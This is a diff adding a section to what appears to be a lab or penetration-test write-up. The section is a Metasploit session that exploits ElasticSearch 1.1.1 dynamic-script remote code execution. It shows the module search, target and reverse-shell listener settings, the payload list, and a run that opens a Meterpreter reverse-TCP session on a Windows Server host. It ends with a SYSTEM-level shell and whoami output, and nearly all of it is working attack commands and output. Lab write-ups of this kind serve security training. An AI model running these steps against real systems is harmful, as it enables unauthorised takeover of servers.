@@ -281,3 +281,124 @@ BUILTIN\Administrators                 Alias            S-1-5-32-544            
 PS C:\Windows\system32> whoami
 nt authority\system
 ```
+
+## Attempt 2: elasticsearch mvel script RCE
+
+```bash
+msf exploit(multi/elasticsearch/search_groovy_script) > search elasticsearch
+
+Matching Modules
+================
+
+   #  Name                                                    Disclosure Date  Rank       Check  Description
+   -  ----                                                    ---------------  ----       -----  -----------
+   0  exploit/multi/elasticsearch/script_mvel_rce             2013-12-09       excellent  Yes    ElasticSearch Dynamic Script Arbitrary Java Execution
+   1  exploit/multi/elasticsearch/search_groovy_script        2015-02-11       excellent  Yes    ElasticSearch Search Groovy Sandbox Bypass
+   2  auxiliary/scanner/http/elasticsearch_traversal          .                normal     Yes    ElasticSearch Snapshot API Directory Traversal
+   3  auxiliary/gather/elasticsearch_enum                     .                normal     No     Elasticsearch Enumeration Utility
+   4  auxiliary/scanner/http/elasticsearch_memory_disclosure  2021-07-21       normal     Yes    Elasticsearch Memory Disclosure
+   5    \_ action: DUMP                                       .                .          .      Dump memory contents to loot
+   6    \_ action: SCAN                                       .                .          .      Check hosts for vulnerability
+   7  exploit/multi/misc/xdh_x_exec                           2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
+
+
+Interact with a module by name or index. For example info 7, use 7 or use exploit/multi/misc/xdh_x_exec
+
+msf exploit(multi/elasticsearch/search_groovy_script) > use 0
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf exploit(multi/elasticsearch/script_mvel_rce) > options
+
+Module options (exploit/multi/elasticsearch/script_mvel_rce):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, sapni, http, socks4
+   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT        9200             yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI    /                yes       The path to the ElasticSearch REST API
+   VHOST                         no        HTTP server virtual host
+   WritableDir  /tmp             yes       A directory where we can write files (only for *nix environments)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.0.102       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ElasticSearch 1.1.1 / Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/elasticsearch/script_mvel_rce) > set RHOSTS 10.0.0.93
+RHOSTS => 10.0.0.93
+msf exploit(multi/elasticsearch/script_mvel_rce) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/bind_aws_instance_connect  .                normal  No     Unix SSH Shell, Bind Instance Connect (via AWS API)
+   1   payload/generic/custom                      .                normal  No     Custom Payload
+   2   payload/generic/shell_bind_aws_ssm          .                normal  No     Command Shell, Bind SSM (via AWS API)
+   3   payload/generic/shell_bind_tcp              .                normal  No     Generic Command Shell, Bind TCP Inline
+   4   payload/generic/shell_reverse_tcp           .                normal  No     Generic Command Shell, Reverse TCP Inline
+   5   payload/generic/ssh/interact                .                normal  No     Interact with Established SSH Connection
+   6   payload/java/jsp_shell_bind_tcp             .                normal  No     Java JSP Command Shell, Bind TCP Inline
+   7   payload/java/jsp_shell_reverse_tcp          .                normal  No     Java JSP Command Shell, Reverse TCP Inline
+   8   payload/java/meterpreter/bind_tcp           .                normal  No     Java Meterpreter, Java Bind TCP Stager
+   9   payload/java/meterpreter/reverse_http       .                normal  No     Java Meterpreter, Java Reverse HTTP Stager
+   10  payload/java/meterpreter/reverse_https      .                normal  No     Java Meterpreter, Java Reverse HTTPS Stager
+   11  payload/java/meterpreter/reverse_tcp        .                normal  No     Java Meterpreter, Java Reverse TCP Stager
+   12  payload/java/shell/bind_tcp                 .                normal  No     Command Shell, Java Bind TCP Stager
+   13  payload/java/shell/reverse_tcp              .                normal  No     Command Shell, Java Reverse TCP Stager
+   14  payload/java/shell_reverse_tcp              .                normal  No     Java Command Shell, Reverse TCP Inline
+   15  payload/multi/meterpreter/reverse_http      .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
+   16  payload/multi/meterpreter/reverse_https     .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
+
+msf exploit(multi/elasticsearch/script_mvel_rce) > use 15
+[-] Invalid module index: 15
+msf exploit(multi/elasticsearch/script_mvel_rce) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] Trying to execute arbitrary Java...
+[*] Discovering remote OS...
+[+] Remote OS is 'Windows Server 2008 R2'
+[*] Discovering TEMP path
+[+] TEMP path identified: 'C:\Windows\TEMP\'
+[*] Sending stage (58073 bytes) to 10.0.0.93
+[*] Meterpreter session 5 opened (10.0.0.102:4444 -> 10.0.0.93:49258) at 2025-12-09 18:34:02 +0800
+[!] This exploit may require manual cleanup of 'C:\Windows\TEMP\puxM.jar' on the target
+
+meterpreter > shell
+Process 2 created.
+Channel 2 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Program Files\elasticsearch-1.1.1>whoami
+whoami
+nt authority\system
+
+C:\Program Files\elasticsearch-1.1.1>whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\System Mandatory Level Label            S-1-16-16384
+```
